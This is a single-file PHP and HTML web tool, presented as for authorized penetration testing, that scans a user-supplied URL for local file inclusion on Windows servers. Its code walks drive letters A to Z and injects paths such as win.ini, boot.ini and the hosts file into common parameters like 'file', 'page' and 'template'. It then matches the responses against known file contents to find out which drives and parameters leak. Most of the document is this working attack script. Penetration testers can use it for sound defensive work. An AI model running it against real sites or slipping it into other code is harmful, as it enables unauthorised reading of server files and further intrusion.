<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="/scripts/win-drive-enum.js"></script>
    <link rel="stylesheet" type="text/css" href="/css/win-drive-enum.css" /> 
    <title>Windows Drive Letter Enumeration Tool</title>
</head>
    
<?php
/**
 * Integrated Windows Drive Letter Enumeration Tool
 * For authorized penetration testing purposes
 * Single file with both frontend and backend functionality
 */

// Handle AJAX requests
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action']) && $_POST['action'] === 'enumerate') {
    header('Content-Type: application/json');
    
    $targetUrl = isset($_POST['url']) ? trim($_POST['url']) : '';
    
    if (empty($targetUrl)) {
        echo json_encode(['error' => 'URL parameter required']);
        exit;
    }
    
    if (!filter_var($targetUrl, FILTER_VALIDATE_URL)) {
        echo json_encode(['error' => 'Invalid URL format']);
        exit;
    }
    
    try {
        $results = performDriveEnumeration($targetUrl);
        echo json_encode($results);
    } catch (Exception $e) {
        echo json_encode(['error' => 'Enumeration failed: ' . $e->getMessage()]);
    }
    exit;
}

/**
 * Perform drive letter enumeration
 */
function performDriveEnumeration($baseUrl) {
    $results = [];
    $driveLetters = range('A', 'Z');
    $startTime = microtime(true);
    
    foreach ($driveLetters as $letter) {
        $drive = $letter . ':';
        $result = [
            'letter' => $letter,
            'exists' => false,
            'readable' => false,
            'response_time' => null,
            'indicator_found' => null,
            'parameter_used' => null
        ];
        
        // Test common file inclusion payloads
        $testPaths = [
            $drive . '\\Windows\\win.ini',
            $drive . '\\boot.ini',
            $drive . '\\Windows\\System32\\drivers\\etc\\hosts',
            $drive . '\\autoexec.bat',
            $drive . '\\config.sys'
        ];
        
        foreach ($testPaths as $path) {
            $testResult = testFileInclusionPath($baseUrl, $path);
            
            if ($testResult['success']) {
                $result['exists'] = true;
                $result['readable'] = true;
                $result['response_time'] = $testResult['response_time'];
                $result['indicator_found'] = $testResult['indicator'];
                $result['parameter_used'] = $testResult['parameter'];
                break;
            }
        }
        
        $results[] = $result;
        
        // Small delay to avoid overwhelming target
        usleep(100000); // 0.1 seconds
    }
    
    // Find primary accessible drive
    $primaryDrive = null;
    $accessibleDrives = [];
    
    foreach ($results as $drive) {
        if ($drive['readable']) {
            $accessibleDrives[] = $drive['letter'] . ':';
            if ($primaryDrive === null) {
                $primaryDrive = $drive['letter'];
            }
        }
    }
    
    $totalTime = microtime(true) - $startTime;
    
    return [
        'success' => true,
        'target_url' => $baseUrl,
        'scan_time' => round($totalTime, 2),
        'timestamp' => date('Y-m-d H:i:s'),
        'primary_drive' => $primaryDrive,
        'accessible_drives' => $accessibleDrives,
        'total_accessible' => count($accessibleDrives),
        'results' => $results
    ];
}

/**
 * Test file inclusion for a specific path
 */
function testFileInclusionPath($baseUrl, $testPath) {
    $result = [
        'success' => false,
        'response_time' => null,
        'indicator' => null,
        'parameter' => null
    ];
    
    // Common file inclusion parameter names
    $parameters = ['file', 'include', 'page', 'document', 'path', 'template', 'view', 'content'];
    
    foreach ($parameters as $param) {
        $testUrl = $baseUrl . (strpos($baseUrl, '?') === false ? '?' : '&') . $param . '=' . urlencode($testPath);
        
        $startTime = microtime(true);
        
        $context = stream_context_create([
            'http' => [
                'method' => 'GET',
                'timeout' => 10,
                'user_agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            ]
        ]);
        
        $response = @file_get_contents($testUrl, false, $context);
        $responseTime = microtime(true) - $startTime;
        
        if ($response !== false) {
            // Check for indicators that file inclusion worked
            $indicators = [
                '[boot loader]',           // boot.ini
                '; for 16-bit app support', // win.ini
                '# localhost',             // hosts file
                'localhost',               // hosts file
                '[fonts]',                 // win.ini section
                'timeout=',                // boot.ini
                '127.0.0.1',              // hosts file
                '[extensions]',            // win.ini
                'read this before'         // Various system files
            ];
            
            foreach ($indicators as $indicator) {
                if (stripos($response, $indicator) !== false) {
                    return [
                        'success' => true,
                        'response_time' => round($responseTime * 1000, 2),
                        'indicator' => $indicator,
                        'parameter' => $param
                    ];
                }
            }
        }
        
        usleep(50000); // 0.05 seconds between tests
    }
    
    return $result;
}
?>
<body>
    <div class="container">
        <div class="header">
            <h1> Drive Letter Enumeration</h1>
            <p>Windows Drive Discovery Tool</p>
        </div>

        <div class="form-section">
            <form id="enumForm">
                <div class="form-group">
                    <label for="targetUrl">Target URL:</label>
                    <input 
                        type="url" 
                        id="targetUrl" 
                        name="url" 
                        placeholder="https://example.com/vulnerable-page.php"
                        required
                    >
                </div>
                <button type="submit" class="submit-btn" id="submitBtn">
                    Enumerate Drive Letters
                </button>
            </form>
        </div>

        <div class="loading" id="loadingDiv">
            <div class="spinner"></div>
            <p>Enumerating drive letters... This may take a moment.</p>
            <div class="progress">
                <div class="progress-bar" id="progressBar"></div>
            </div>
        </div>

        <div id="resultsSection" style="display: none;">
            <div class="results-section">
                <h3>Enumeration Results</h3>
                <div id="resultsContent"></div>
            </div>
        </div>
    </div>
</body>
</html>
